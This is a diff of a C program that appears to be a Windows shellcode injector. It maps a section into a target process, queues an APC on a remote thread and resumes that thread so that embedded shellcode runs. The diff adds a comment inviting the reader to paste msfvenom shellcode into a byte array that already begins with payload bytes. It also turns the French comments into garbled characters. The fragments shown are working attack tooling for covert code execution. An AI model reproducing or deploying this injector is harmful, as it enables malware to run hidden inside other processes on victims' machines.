@@ -109,6 +109,7 @@ HANDLE GiveMeMyProcessHandle(WCHAR* ProcessName, OUT int* PID) {
 BOOL SettingMap(HANDLE* outSection, PVOID* outRemoteBase, HANDLE hProcess) {
 #include <stdint.h>
 
+	// Put your msfvenom shellcode here !
 	uint8_t payload[] = {
 		 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00,
 	0x41, 0x51, 0x41, 0x50, 0x52, 0x48, 0x31, 0xd2, 0x65, 0x48,
@@ -304,7 +305,7 @@ BOOL InjectShellcodeAPCmanually(HANDLE hProcess, PVOID pBaseSection) {
 
 	printf("[+] APC queued successfully on thread %lu\n", threadId);
 
-	// Maintenant que l'APC est queuÈ, on relance le thread
+	// Maintenant que l'APC est queu√©, on relance le thread
 	if (ResumeThread(hThread) == (DWORD)-1) {
 		printf("[!] Failed to resume thread\n");
 		CloseHandle(hThread);
@@ -313,7 +314,7 @@ BOOL InjectShellcodeAPCmanually(HANDLE hProcess, PVOID pBaseSection) {
 
 	printf("[+] Thread resumed, shellcode should execute now.\n");
 
-	// Ferme le handle localement, l'exÈcution est dÈj‡ partie
+	// Ferme le handle localement, l'ex√©cution est d√©j√† partie
 	CloseHandle(hThread);
 	return TRUE;
 }
